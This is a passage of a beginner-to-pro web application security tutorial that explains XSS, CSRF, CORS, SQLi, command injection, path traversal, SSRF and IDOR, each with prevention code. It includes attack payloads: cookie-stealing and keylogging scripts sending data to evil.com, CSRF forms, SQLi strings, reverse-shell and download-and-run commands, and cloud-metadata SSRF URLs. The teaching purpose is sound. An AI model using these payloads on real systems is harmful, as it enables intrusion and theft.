# Web Application Security: Attacks and Remediation — Beginner to Pro Mastery

> **Scope:** Every major web attack from first principles → how it works → real payloads → impact → prevention code. CSRF, CORS, XSS, SQLi, SSRF, IDOR, Rate Limiting, JWT attacks, Clickjacking, XXE, Prototype Pollution, ReDoS, Open Redirect, SSTI, Mass Assignment, and more. OWASP Top 10 mapping, HTTP security headers reference, interview Q&A, and cheatsheet.

---

## Table of Contents

1. [Attacker's Mental Model](#1-attackers-mental-model)
2. [XSS — Cross-Site Scripting](#2-xss)
3. [CSRF — Cross-Site Request Forgery](#3-csrf)
4. [CORS Misconfigurations](#4-cors)
5. [SQL Injection](#5-sql-injection)
6. [Command Injection](#6-command-injection)
7. [Path Traversal](#7-path-traversal)
8. [SSRF — Server-Side Request Forgery](#8-ssrf)
9. [IDOR — Broken Access Control](#9-idor)
10. [Rate Limiting, Brute Force, Credential Stuffing](#10-rate-limiting)
11. [Clickjacking](#11-clickjacking)
12. [XXE — XML External Entity](#12-xxe)
13. [Insecure Deserialization](#13-deserialization)
14. [JWT Attacks](#14-jwt-attacks)
15. [Prototype Pollution](#15-prototype-pollution)
16. [Open Redirect](#16-open-redirect)
17. [SSTI — Server-Side Template Injection](#17-ssti)
18. [Mass Assignment](#18-mass-assignment)
19. [ReDoS — Regular Expression Denial of Service](#19-redos)
20. [Security Misconfiguration](#20-security-misconfiguration)
21. [Supply Chain Attacks](#21-supply-chain)
22. [HTTP Security Headers Reference](#22-security-headers)
23. [OWASP Top 10 (2021) Mapping](#23-owasp-top-10)
24. [Interview Q&A: Beginner to Pro](#24-interview-qa)
25. [Cheatsheet: Attacks + Prevention](#25-cheatsheet)

---

## 1. Attacker's Mental Model

### How Attackers Think

```text
Every attack follows the same pattern:

  INPUT  → APPLICATION → OUTPUT
    ↑                       ↑
  Attacker injects         Attacker receives
  malicious data           the result

The attacker's goal:
  Exfiltrate data (read user data, credentials, secrets)
  Modify data    (change account info, inject content)
  Execute code   (run commands on the server or victim's browser)
  Deny access    (crash the service, exhaust resources)
  Escalate privilege (regular user → admin → root)

The attacker's entry points (attack surface):
  Every input field (forms, URL params, headers, cookies, JSON bodies)
  Every external integration (file uploads, APIs, XML parsers)
  Every user-controlled value (User-Agent, Referer, X-Forwarded-For)
  Every piece of code you import (npm packages, pip packages)
```

### The Defense Mindset

```text
Never trust input:
  "Trust but verify" → "Verify, then trust"
  All input is hostile until proven otherwise
  Input from: users, browsers, partner APIs, environment variables, config files

Defense in depth:
  Multiple layers of protection → one layer failing doesn't mean compromise
  Input validation → output encoding → parameterized queries → least privilege →
  monitoring → alerting → incident response

Shift left:
  Find vulnerabilities in development (cheap) not in production (expensive)
  Use: SAST (static analysis), DAST (dynamic scanning), dependency audit, threat modeling
```

---

## 2. XSS — Cross-Site Scripting

### Intuition

XSS tricks a website into **serving malicious JavaScript** to its own users. The browser trusts content from the website — so when the attacker's script runs, it has full access to the page's cookies, localStorage, DOM, and can make authenticated API calls as the victim.

```text
Normal flow:   Bank website → HTML/JS → User's browser runs the bank's JS

XSS flow:      Bank website → HTML/ATTACKER'S JS → User's browser runs attacker's JS
                                                    ↓
                              Attacker can: steal session cookies
                                            capture keystrokes
                                            redirect to phishing page
                                            make API calls as the victim
                                            exfiltrate localStorage tokens
```

### Three Types of XSS

**Stored XSS (Persistent):**

```text
Attacker submits malicious script via a form (comment, profile name, chat message).
Server saves it in the database.
When any user views that content, the script runs in their browser.

Most dangerous: affects every user who views the page, persists until removed.

Example: Comment form on a blog
  Attacker submits comment:
    <script>document.location='https://evil.com/steal?c='+document.cookie</script>
  
  Server saves this to the database.
  When any user loads the blog post → their browser executes the script → cookies stolen.
```

**Reflected XSS:**

```text
Malicious script is embedded in a URL parameter.
Server "reflects" the input back in the response without sanitizing.
Attacker tricks victim into clicking a crafted URL.

Example: Search page
  Vulnerable code (Node.js/Express):
    app.get('/search', (req, res) => {
      res.send(`<p>Results for: ${req.query.q}</p>`);   // unsafe!
    });
  
  Attacker crafts URL:
    https://legit-site.com/search?q=<script>fetch('https://evil.com?c='+btoa(document.cookie))</script>
  
  Victim clicks link → server reflects the script → victim's browser runs it.
  
  Less dangerous than stored (requires victim to click), but still very common.
```

**DOM-Based XSS:**

```text
Vulnerability is entirely client-side. Server returns safe HTML,
but JavaScript on the page writes attacker data to the DOM unsafely.

Example:
  // Vulnerable code — common pattern
  const name = new URLSearchParams(location.search).get('name');
  document.getElementById('greeting').innerHTML = 'Hello ' + name;  // UNSAFE!
  
  Attacker URL:
    https://site.com/hello?name=<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
  
  Server never sees the payload — it's processed entirely in the browser.
  Traditional WAFs (Web Application Firewalls) often miss DOM XSS.
```

### XSS Payloads (Common Patterns)

```html
<!-- Cookie stealing -->
<script>new Image().src='https://evil.com/?c='+document.cookie</script>
<script>fetch('https://evil.com/c?d='+btoa(document.cookie))</script>

<!-- Keylogger -->
<script>document.onkeypress=e=>fetch('https://evil.com/k?k='+e.key)</script>

<!-- LocalStorage exfiltration -->
<script>fetch('https://evil.com/?t='+btoa(localStorage.getItem('token')))</script>

<!-- Bypass quotes/filter -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<svg onload=alert(1)>
<div onmouseover="alert(1)">hover me</div>
javascript:alert(1)   <!-- in href attributes -->

<!-- Polyglot XSS (works in multiple contexts) -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### XSS Prevention

**1. Output Encoding (Context-Aware)**

```javascript
// NEVER insert user data directly into HTML:
// BAD:
element.innerHTML = userInput;
document.write(userInput);
res.send(`<p>${userInput}</p>`);

// GOOD — use textContent for text:
element.textContent = userInput;     // safe: never interprets as HTML

// GOOD — for HTML rendering, use a sanitizer:
// DOMPurify (client-side) — industry standard
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// GOOD — server-side (Node.js) — encode for HTML context:
import { escape } from 'lodash';
res.send(`<p>${escape(userInput)}</p>`);
// Encodes: & → &amp;  < → &lt;  > → &gt;  " → &quot;  ' → &#x27;

// Different contexts require different encoding:
// HTML context:       &lt; &gt; &amp; &quot;
// HTML attribute:     same as HTML + &#x27; for single quotes
// JavaScript context: \u0022 \u003c etc. (or use JSON.stringify)
// CSS context:        \XX hex encoding
// URL context:        %XX percent encoding (encodeURIComponent)
```

**2. Content Security Policy (CSP)**

```http
# Strict CSP — prevents XSS by blocking inline scripts and unknown sources
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM_NONCE}' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.yoursite.com;
  font-src 'self' https://fonts.googleapis.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
  report-uri https://csp-report.yoursite.com;
```

```javascript
// Nonce-based CSP (best practice — per request, random)
const crypto = require('crypto');

app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  res.setHeader('Content-Security-Policy',
    `script-src 'self' 'nonce-${res.locals.nonce}'; object-src 'none'; base-uri 'self'`
  );
  next();
});

// In your HTML template:
// <script nonce="<%= nonce %>">  // only scripts with this nonce run
```

**3. HttpOnly Cookies (Prevents Cookie Theft)**

```javascript
// Even if XSS executes, HttpOnly cookies can't be read by JS
res.cookie('sessionId', token, {
  httpOnly: true,   // JS cannot access document.cookie for this cookie
  secure: true,     // HTTPS only
  sameSite: 'Strict',
});
```

**4. Trusted Types API (Chrome — Prevents DOM XSS)**

```html
<meta http-equiv="Content-Security-Policy" content="require-trusted-types-for 'script'">
```

```javascript
// Forces all innerHTML assignments to go through a policy
const policy = trustedTypes.createPolicy('myPolicy', {
  createHTML: (input) => DOMPurify.sanitize(input)
});
element.innerHTML = policy.createHTML(userInput);  // safe
element.innerHTML = userInput;  // throws: violates Trusted Types policy
```

---

## 3. CSRF — Cross-Site Request Forgery

### Intuition

CSRF tricks an authenticated user's browser into sending a request to a trusted website **without the user's knowledge**. The browser automatically includes cookies for that site — so the request looks legitimate to the server.

```text
Normal flow:
  User logged in → User clicks "Transfer $100" → POST /transfer → Cookie sent → Bank processes it

CSRF flow:
  User logged in to bank.com
  User visits evil.com (or any page with attacker's HTML)
  evil.com has: <img src="https://bank.com/transfer?to=attacker&amount=10000">
  Browser GETs that URL — automatically sends bank.com cookies!
  Bank processes transfer as if user did it.
```

### CSRF Attack Examples

```html
<!-- GET-based CSRF (if server accepts state-changing GET requests) -->
<img src="https://bank.com/transfer?to=attacker&amount=9999&currency=USD" 
     width="0" height="0">

<!-- POST-based CSRF — auto-submitting form -->
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://bank.com/transfer" method="POST">
      <input type="hidden" name="to"       value="attacker">
      <input type="hidden" name="amount"   value="9999">
      <input type="hidden" name="currency" value="USD">
    </form>
  </body>
</html>

<!-- PUT/DELETE-based CSRF using fetch() from attacker site -->
<!-- Only works if target server has permissive CORS! -->
<script>
  fetch('https://api.target.com/user/profile', {
    method: 'PUT',
    credentials: 'include',  // sends cookies
    body: JSON.stringify({ email: 'attacker@evil.com' })
  });
</script>
```

### CSRF Prevention

**1. SameSite Cookie Attribute (Modern Prevention)**

```javascript
// SameSite=Strict: cookie NEVER sent cross-site
res.cookie('sessionId', token, {
  sameSite: 'Strict',  // strongest: no cross-site at all
  httpOnly: true,
  secure: true,
});

// SameSite=Lax: cookie sent only on top-level GET navigations (default in modern browsers)
// Protects against most CSRF (POST forms) but allows link navigation
res.cookie('sessionId', token, {
  sameSite: 'Lax',     // good balance for most sites
  httpOnly: true,
  secure: true,
});

// SameSite=None: cookie always sent cross-site (requires Secure)
// Only use for legitimate third-party cookie needs (OAuth callbacks, embeds)
res.cookie('partnerToken', value, {
  sameSite: 'None',
  secure: true,  // REQUIRED with SameSite=None
});
```

**2. CSRF Token (Synchronizer Token Pattern)**

```javascript
// Server generates a random CSRF token per session
const crypto = require('crypto');

// Generate on session start
req.session.csrfToken = crypto.randomBytes(32).toString('hex');

// Embed in forms (hidden field)
// In HTML template:
// <input type="hidden" name="_csrf" value="<%= csrfToken %>">

// Verify on state-changing requests
function csrfMiddleware(req, res, next) {
  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
    const tokenFromForm = req.body._csrf || req.headers['x-csrf-token'];
    const tokenFromSession = req.session.csrfToken;
    
    if (!tokenFromForm || !timingSafeEqual(tokenFromForm, tokenFromSession)) {
      return res.status(403).json({ error: 'Invalid CSRF token' });
    }
  }
  next();
}

// Timing-safe comparison (prevent timing attacks)
const { timingSafeEqual } = require('crypto');
function safeCsrfCompare(a, b) {
  const bufA = Buffer.from(a);
  const bufB = Buffer.from(b);
  if (bufA.length !== bufB.length) return false;
  return timingSafeEqual(bufA, bufB);
}
```

**3. Double Submit Cookie Pattern (Stateless CSRF)**

```javascript
// For stateless APIs (no server-side sessions):
// Server sends CSRF token in both a cookie AND expects it in a header
// Attacker can't read the cookie (SameSite + CORS) to copy it to the header

// On login/session start:
res.cookie('csrf-token', crypto.randomBytes(32).toString('hex'), {
  httpOnly: false,  // must be readable by JS so it can be sent in header
  sameSite: 'Strict',
  secure: true,
});

// Client reads cookie and sends in header:
// X-CSRF-Token: {value from csrf-token cookie}

// Server validates header matches cookie:
app.use((req, res, next) => {
  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
    const headerToken = req.headers['x-csrf-token'];
    const cookieToken = req.cookies['csrf-token'];
    if (!headerToken || headerToken !== cookieToken) {
      return res.status(403).json({ error: 'CSRF validation failed' });
    }
  }
  next();
});
```

**4. Origin / Referer Validation**

```javascript
// Check the Origin header on state-changing requests
app.use((req, res, next) => {
  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
    const origin = req.headers.origin || req.headers.referer;
    const allowed = ['https://yoursite.com', 'https://www.yoursite.com'];
    
    if (!origin || !allowed.some(a => origin.startsWith(a))) {
      return res.status(403).json({ error: 'Forbidden' });
    }
  }
  next();
});
// Note: Referer can be suppressed (Referrer-Policy: no-referrer) — combine with CSRF tokens
```

---

## 4. CORS Misconfigurations

### How CORS Works (Foundation)

```text
Same-Origin Policy: browsers block JS from reading responses from a different origin.
  Origin = protocol + hostname + port
  https://api.example.com:443  ≠  https://other.com:443  (different hostname)
  http://example.com           ≠  https://example.com    (different protocol)

CORS (Cross-Origin Resource Sharing): HTTP headers that allow controlled exceptions.
  Server explicitly says: "I allow origin X to read my responses"
  
  Key headers:
    Request:  Origin: https://calling-site.com
    Response: Access-Control-Allow-Origin: https://calling-site.com
              (if absent → browser blocks JS from reading the response)
```

### CORS Misconfiguration #1: Wildcard + Credentials

```javascript
// DANGEROUS: This does NOT work (browser rejects it)
// but some libraries accidentally implement logic like this:
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');

// Chrome error: "Cannot use wildcard in Access-Control-Allow-Origin 
//               when credentials flag is true"
// BUT: some servers use Access-Control-Allow-Origin: * for preflight
//      and per-origin for credentialed requests — misconfiguration risk
```

### CORS Misconfiguration #2: Reflecting Origin Without Validation

```javascript
// VULNERABLE — blindly reflects whatever Origin the request sends
app.use((req, res, next) => {
  const origin = req.headers.origin;
  res.setHeader('Access-Control-Allow-Origin', origin);        // DANGEROUS!
  res.setHeader('Access-Control-Allow-Credentials', 'true');   // allows cookies
  next();
});

// Attack:
// attacker.com sends: Origin: https://attacker.com
// Server responds: Access-Control-Allow-Origin: https://attacker.com
//                  Access-Control-Allow-Credentials: true
// Browser: attacker.com can now read API responses WITH the user's cookies!
// → Account takeover, data exfiltration
```

### CORS Misconfiguration #3: Prefix/Suffix Matching

```javascript
// VULNERABLE — checks prefix only
const origin = req.headers.origin;
if (origin && origin.startsWith('https://yoursite.com')) {
  res.setHeader('Access-Control-Allow-Origin', origin);  // WRONG
}
// Attack: https://yoursite.com.evil.com → passes the prefix check!

// VULNERABLE — null origin
if (origin === 'null') {
  res.setHeader('Access-Control-Allow-Origin', 'null');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
}
// Attack: sandboxed iframe sends Origin: null → gets full access
```

### Correct CORS Implementation

```javascript
// SECURE: whitelist approach with exact matching
const ALLOWED_ORIGINS = new Set([
  'https://yoursite.com',
  'https://www.yoursite.com',
  'https://app.yoursite.com',
  // Development only (gated by NODE_ENV):
  ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000'] : []),
]);

function corsMiddleware(req, res, next) {
  const origin = req.headers.origin;
  
  if (origin && ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);  // exact origin only
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');  // IMPORTANT: tell caches the response varies by Origin
  }
  
  if (req.method === 'OPTIONS') {
    // Preflight response
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-CSRF-Token');
    res.setHeader('Access-Control-Max-Age', '86400');  // cache preflight for 24h
    return res.status(204).end();
  }
  
  next();
}

// Express CORS library (safe usage):
const cors = require('cors');
app.use(cors({
  origin: (origin, callback) => {
    if (!origin || ALLOWED_ORIGINS.has(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
}));
```

---

## 5. SQL Injection

### Intuition

SQL Injection occurs when user input is concatenated directly into a SQL query. The attacker's input **breaks out of the data context** and becomes part of the SQL command.

```text
Normal: SELECT * FROM users WHERE email = 'alice@example.com'
Attack: SELECT * FROM users WHERE email = '' OR '1'='1' --'

The -- comments out the rest of the query.
'1'='1' is always true → returns ALL rows in the users table!
```

### SQL Injection Examples

```sql
-- Authentication bypass
-- Vulnerable code: SELECT * FROM users WHERE email='"+email+"' AND password='"+pass+"'
-- Input: email = ' OR '1'='1' --
-- Result: SELECT * FROM users WHERE email='' OR '1'='1' --' AND password='...'
--         → returns first user in DB (usually admin)

-- UNION attack — extract data from other tables
-- Input: email = ' UNION SELECT username, password, null FROM admin_users --
-- Result: appends admin_users table to original result set

-- Blind SQL injection — true/false responses
-- Input: ' AND 1=1 -- (returns normal response)
-- Input: ' AND 1=2 -- (returns empty/error → confirms SQLi exists)
-- Attacker extracts data one bit at a time:
-- ' AND SUBSTRING(password,1,1)='a' --  → if normal response, first char is 'a'

-- Time-based blind (no visible difference in responses)
-- MySQL: ' AND SLEEP(5) --   (delays 5 seconds = confirms SQLi)
-- MSSQL: '; WAITFOR DELAY '0:0:5' --
-- PostgreSQL: '; SELECT pg_sleep(5) --

-- Stacked queries (MSSQL, PostgreSQL) — execute multiple queries
-- '; DROP TABLE users; --
-- '; INSERT INTO admin_users VALUES ('hacker','password123'); --
```

### SQL Injection Prevention

**1. Parameterized Queries (Prepared Statements) — The Only Real Fix**

```javascript
// Node.js with mysql2 — SAFE
const [rows] = await db.execute(
  'SELECT * FROM users WHERE email = ? AND password_hash = ?',
  [email, hashedPassword]
  // Values passed separately — never concatenated into SQL string
  // The ? placeholders can ONLY be values, never SQL structure
);

// Node.js with PostgreSQL (pg) — SAFE
const result = await client.query(
  'SELECT * FROM users WHERE email = $1',
  [email]
);

// Python (psycopg2) — SAFE
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))

// Java (JDBC) — SAFE
PreparedStatement stmt = conn.prepareStatement(
  "SELECT * FROM users WHERE email = ?"
);
stmt.setString(1, email);
ResultSet rs = stmt.executeQuery();

// BAD (string concatenation) — NEVER DO THIS:
db.query(`SELECT * FROM users WHERE email = '${email}'`);   // VULNERABLE
db.query("SELECT * FROM users WHERE email = '" + email + "'");  // VULNERABLE
```

**2. ORM Usage (Still Need Parameterization)**

```javascript
// Sequelize — SAFE (ORM handles parameterization)
const user = await User.findOne({ where: { email: email } });

// UNSAFE even with ORM — raw queries bypass protection:
await User.findAll({
  where: sequelize.literal(`email = '${email}'`)  // VULNERABLE!
});

// Prisma — SAFE
const user = await prisma.user.findUnique({ where: { email } });

// TypeORM — SAFE
const user = await userRepository.findOne({ where: { email } });

// TypeORM raw query — SAFE with parameterization:
const user = await userRepository.query(
  'SELECT * FROM users WHERE email = $1', [email]
);
```

**3. Stored Procedures**

```sql
-- SAFE: parameter values cannot alter query structure
CREATE PROCEDURE GetUser @email NVARCHAR(255)
AS
  SELECT * FROM users WHERE email = @email;
```

**4. Input Validation (Defense in Depth, NOT Primary Fix)**

```javascript
// Validate email format before using it in query
const emailRegex = /^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/;
if (!emailRegex.test(email)) {
  return res.status(400).json({ error: 'Invalid email' });
}
// Even with this, ALWAYS use parameterized queries
```

**5. Database Least Privilege**

```sql
-- Application DB user should NOT have:
--   DROP TABLE, CREATE TABLE, GRANT, admin access
-- Only grant what's needed:
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE, DELETE ON myapp.* TO 'app_user'@'localhost';
-- No GRANT for: DROP, ALTER, CREATE, EXECUTE (unless needed)
```

---

## 6. Command Injection

### How It Works

When an application passes user input to a system shell command without sanitization, an attacker can inject additional commands.

```javascript
// VULNERABLE Node.js code
const { exec } = require('child_process');
app.get('/ping', (req, res) => {
  const host = req.query.host;
  exec(`ping -c 3 ${host}`, (error, stdout) => {
    res.send(stdout);
  });
});

// Normal request: /ping?host=google.com → ping -c 3 google.com
// Attack:         /ping?host=google.com;cat /etc/passwd
//                 → ping -c 3 google.com; cat /etc/passwd
//                 → runs TWO commands, returns /etc/passwd contents!

// More dangerous payloads:
// google.com; rm -rf /
// google.com && wget http://evil.com/malware.sh -O /tmp/m.sh && bash /tmp/m.sh
// google.com | nc evil.com 4444 -e /bin/bash  (reverse shell!)
// $(curl evil.com/exploit.sh | bash)          (subshell)
// `id`                                         (backtick execution)
```

### Command Injection Prevention

```javascript
// FIX 1: Avoid exec() with user input entirely
// Use native library/API instead of shell commands:
// ping → use icmp library or net module
// file operations → use fs module, not ls/rm commands
// image resize → use sharp/jimp, not ImageMagick exec

// FIX 2: If shell command is unavoidable, use execFile/spawn with argument array
// (does NOT invoke a shell, no command injection possible)
const { execFile, spawn } = require('child_process');

// execFile: SAFE — arguments are passed separately to the binary
app.get('/ping', (req, res) => {
  const host = req.query.host;
  // Validate first: only allow valid hostnames
  if (!/^[a-zA-Z0-9.\-]+$/.test(host)) {
    return res.status(400).json({ error: 'Invalid hostname' });
  }
  execFile('/bin/ping', ['-c', '3', host], (error, stdout) => {
    res.send(stdout);
  });
});

// spawn: SAFE — same principle, shell not invoked
const child = spawn('ls', ['-la', userProvidedPath]);

// FIX 3: Whitelist allowed values (if input is limited set)
const ALLOWED_OPERATIONS = new Set(['compress', 'decompress', 'info']);
if (!ALLOWED_OPERATIONS.has(req.query.operation)) {
  return res.status(400).json({ error: 'Invalid operation' });
}
```

---

## 7. Path Traversal

### How It Works

Path traversal (directory traversal) tricks a server into reading files outside the intended directory by using `../` sequences in filenames.

```text
Intended: GET /files?name=report.pdf
          → opens /var/www/uploads/report.pdf

Attack:   GET /files?name=../../../../etc/passwd
          → opens /var/www/uploads/../../../../etc/passwd
             = /etc/passwd

On Windows: ..\..\..\Windows\win.ini
URL encoded: %2e%2e%2f%2e%2e%2f
Double-encoded: %252e%252e%252f (bypass naive decode+check)
Unicode: ..%c0%af..%c0%af (invalid UTF-8 bypass)
```

```javascript
// VULNERABLE Express code
app.get('/download', (req, res) => {
  const filename = req.query.file;
  res.sendFile('/var/www/uploads/' + filename);  // path traversal!
});

// Attacker: /download?file=../../../../etc/passwd
```

### Path Traversal Prevention

```javascript
const path = require('path');
const fs   = require('fs');

const UPLOAD_DIR = '/var/www/uploads';

app.get('/download', (req, res) => {
  const filename = req.query.file;
  
  // Step 1: resolve the full path (resolves ../ sequences)
  const requestedPath = path.resolve(UPLOAD_DIR, filename);
  
  // Step 2: verify the resolved path starts with the upload directory
  if (!requestedPath.startsWith(UPLOAD_DIR + path.sep)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // Step 3: verify file exists and is a regular file (not symlink to /etc)
  const stat = fs.statSync(requestedPath, { throwIfNoEntry: false });
  if (!stat || !stat.isFile()) {
    return res.status(404).json({ error: 'File not found' });
  }
  
  // Step 4: serve file
  res.sendFile(requestedPath);
});

// ADDITIONAL: restrict filenames to safe characters
function isSafeFilename(name) {
  return /^[a-zA-Z0-9_\-\.]+$/.test(name) && !name.startsWith('.');
}
```

---

## 8. SSRF — Server-Side Request Forgery

### Intuition

SSRF tricks the SERVER into making requests on behalf of the attacker — to internal services the attacker can't reach directly. The server is the victim's puppet.

```text
Normal: User → Server → External API (safe)

SSRF:   User (attacker) → Server → Internal service (attacker shouldn't reach)
                                    ↓
                         Cloud metadata endpoint:
                         http://169.254.169.254/latest/meta-data/iam/security-credentials/
                         Internal databases, admin panels, Redis, Kubernetes API
```

### SSRF Attack Examples

```bash
# Classic: target provides a URL and server fetches it
POST /fetch-preview HTTP/1.1
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"}
# → Returns AWS IAM credentials from EC2 metadata endpoint!
# → Attacker gets temporary AWS access keys → full account compromise

# AWS IMDSv1 (vulnerable to SSRF):
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data  # may contain secrets in bootstrap scripts

# GCP metadata (same attack):
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure metadata:
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Internal services:
http://localhost:6379/         # Redis (RESP protocol response indicates Redis)
http://localhost:9200/         # Elasticsearch — exposes all data
http://localhost:8080/admin    # Internal admin panel
http://kubernetes.default.svc.cluster.local  # Kubernetes API server
http://127.0.0.1:5432/         # PostgreSQL port

# DNS rebinding, localhost aliases:
http://127.0.0.1/admin
http://0.0.0.0/admin
http://[::1]/admin
http://localhost.attacker.com/admin  # attacker controls DNS for this
```

### SSRF Prevention

```javascript
const dns = require('dns').promises;
const net = require('net');

// Parse and validate a URL before fetching
async function isSafeUrl(urlString) {
  let url;
  try {
    url = new URL(urlString);
  } catch {
    return { safe: false, reason: 'Invalid URL' };
  }
  
  // 1. Only allow specific schemes
  if (!['http:', 'https:'].includes(url.protocol)) {
    return { safe: false, reason: 'Disallowed protocol: ' + url.protocol };
    // Blocks: file://, ftp://, gopher://, dict://, ldap://
  }
  
  // 2. Resolve hostname to IP
  let addresses;
  try {
    const result = await dns.lookup(url.hostname, { all: true });
    addresses = result.map(r => r.address);
  } catch {
    return { safe: false, reason: 'DNS resolution failed' };
  }
  
  // 3. Block private / reserved IP ranges
  for (const addr of addresses) {
    if (isPrivateIP(addr)) {
      return { safe: false, reason: 'Private/internal IP: ' + addr };
    }
  }
  
  // 4. Block specific ports (only allow 80 and 443)
  const port = parseInt(url.port) || (url.protocol === 'https:' ? 443 : 80);
  if (![80, 443].includes(port)) {
    return { safe: false, reason: 'Disallowed port: ' + port };
  }
  
  return { safe: true };
}

function isPrivateIP(ip) {
  const privateRanges = [
    /^127\./,                      // loopback 127.0.0.0/8
    /^10\./,                       // private 10.0.0.0/8
    /^172\.(1[6-9]|2\d|3[01])\./,  // private 172.16.0.0/12
    /^192\.168\./,                  // private 192.168.0.0/16
    /^169\.254\./,                  // link-local (AWS metadata)
    /^::1$/,                        // IPv6 loopback
    /^fc00:/,                       // IPv6 private
    /^fd/,                          // IPv6 private
    /^0\./,                         // 0.0.0.0/8
    /^100\.6[4-9]\.|^100\.[7-9]\d\.|^100\.1[0-1]\d\.|^100\.12[0-7]\./,  // CGN
  ];
  return privateRanges.some(r => r.test(ip));
}

// Usage:
app.post('/fetch-preview', async (req, res) => {
  const { url } = req.body;
  const check = await isSafeUrl(url);
  if (!check.safe) {
    return res.status(400).json({ error: 'Disallowed URL: ' + check.reason });
  }
  
  const response = await fetch(url, {
    redirect: 'error',   // prevent redirect-based bypass (redirect to 169.254.x.x)
    timeout: 5000,
  });
  // ... process response
});
```

**AWS IMDSv2 (Prevents SSRF from Reaching Metadata)**

```bash
# AWS IMDSv2 requires a session token PUT request first
# SSRF attacks can't do two-step requests in most scenarios

# Enforce IMDSv2 via Terraform:
# aws_instance with metadata_options { http_tokens = "required" }

# Or via AWS CLI:
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxxxxxxxx \
  --http-tokens required \
  --http-endpoint enabled
```

---

## 9. IDOR — Broken Access Control

### Intuition

IDOR (Insecure Direct Object Reference) occurs when an application uses user-controllable values (IDs) to access resources **without verifying the requesting user owns that resource**.

```text
Normal:  User 123 requests /api/invoices/456
         Server checks: does User 123 own Invoice 456? YES → return it

IDOR:    Attacker (User 789) requests /api/invoices/456
         Vulnerable server: user is logged in, that's enough → returns Invoice 456!
         Attacker can enumerate: /api/invoices/455, /api/invoices/457, /api/invoices/1 ...
```

### IDOR Examples

```text
Horizontal IDOR (same privilege, different user's data):
  GET  /api/orders/12345          → gets someone else's order
  GET  /api/users/42/profile      → reads another user's profile
  POST /api/messages/send to_id=42 → send messages as another user
  PUT  /api/invoices/99/pay       → pay another user's invoice (or mark yours paid)
  GET  /api/export?userId=456     → export someone else's data

Vertical IDOR (privilege escalation):
  PUT /api/users/me { "role": "admin" }    → self-assign admin role
  GET /api/admin/users                     → regular user accessing admin endpoint
  POST /api/users/1/delete                 → delete another user's account

Indirect references:
  /download?file=invoice_00042.pdf         → enumerate sequential filenames
  /api/reset-password?token=abc123         → guess weak tokens
```

### IDOR Prevention

```javascript
// ALWAYS verify ownership in every query, every endpoint

// BAD — missing authorization check:
app.get('/api/orders/:orderId', authenticate, async (req, res) => {
  const order = await Order.findByPk(req.params.orderId);  // ← no ownership check!
  res.json(order);
});

// GOOD — include userId in the query:
app.get('/api/orders/:orderId', authenticate, async (req, res) => {
  const order = await Order.findOne({
    where: {
      id: req.params.orderId,
      userId: req.user.id,    // ← user can only get their OWN order
    }
  });
  if (!order) return res.status(404).json({ error: 'Not found' });
  res.json(order);
});

// Vertical access control — role-based middleware:
function requireRole(...roles) {
  return (req, res, next) => {
    if (!req.user || !roles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  };
}

app.delete('/api/admin/users/:id', authenticate, requireRole('admin'), async (req, res) => {
  await User.destroy({ where: { id: req.params.id } });
  res.json({ success: true });
});

// Indirect reference maps (hide real IDs):
// Instead of using sequential DB IDs in URLs, use UUIDs or hashed references
// UUIDs: much harder to enumerate than 1, 2, 3, 4...
// npm: uuid → generates v4 UUIDs (random, non-sequential)
import { v4 as uuidv4 } from 'uuid';
const id = uuidv4(); // '9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d'
```

---

## 10. Rate Limiting, Brute Force, and Credential Stuffing

### Attack Types

```text
Brute Force:
  Try every possible password for a known username.
  Rate: ~10 billion passwords/second with GPU cracking offline
  Against online login: depends on server rate limiting

Dictionary Attack:
  Try common passwords from a wordlist (rockyou.txt = 14M common passwords)
  Most accounts use weak passwords → dictionary attacks succeed often

Credential Stuffing:
  Use username:password pairs leaked from OTHER data breaches.
  "Many people reuse passwords" → high hit rate.
  Automated tools: Sentry MBA, OpenBullet, Snipr
  Scale: millions of attempts per hour using distributed IPs

Account Enumeration:
